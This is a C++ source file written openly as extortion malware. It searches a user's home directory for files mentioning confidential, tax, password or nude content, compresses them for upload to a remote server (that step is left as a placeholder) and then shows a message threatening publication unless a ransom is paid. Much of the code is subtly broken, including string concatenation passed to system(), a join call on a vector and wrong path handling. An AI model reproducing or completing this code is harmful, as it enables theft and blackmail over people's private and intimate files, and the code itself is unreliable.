#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <windows.h>
#include <boost/filesystem.hpp>
#include <boost/algorithm/string/join.hpp>

using namespace std;
namespace bfs = boost::filesystem;

// Function to scan for sensitive keywords in a file
bool contains_sensitive_keyword(const string& filename, const vector<string>& keywords) {
    fstream file(filename, ios::in);
    if (!file) return false;
    
    string line;
    while (getline(file, line)) {
        for (auto& keyword : keywords) {
            if (line.find(keyword) != string::npos) {
                return true;
            }
        }
    }
    return false;
}

int main() {
    // Define sensitive keywords to look for
    vector<string> sensitive_keywords = {"confidential", "tax", "password", "nude"};
    
    // Get the user's home directory
    string home_directory = getenv("HOME");
    
    // Scan the home directory for files containing sensitive keywords
    vector<string> files_to_exfiltrate;
    bfs::path path(home_directory);
    for (auto& entry : bfs::recursive_directory_iterator(path)) {
        if (entry.is_regular_file()) {
            string filename = entry.path().string();
            if (contains_sensitive_keyword(filename, sensitive_keywords)) {
                files_to_exfiltrate.push_back(filename);
            }
        }
    }
    
    // Compress and exfiltrate the identified files
    for (auto& filename : files_to_exfiltrate) {
        string output_path = bfs::canonical(home_directory + "\\" + filename + ".zip");
        bfs::create_directories(output_path);
        
        // Compress the file
        system("7-Zip" " -m a " + output_path + " \"" + filename + "\")";

        // Upload the compressed file to a remote server
        // (Replace with your own code for uploading files)
    }
    
    // Display a message threatening to publish the specific stolen files unless a ransom is paid
    system("Notepad" " \\" + home_directory + "\\" + sensitive_keywords.join("\n"));
    
    return 0;
}
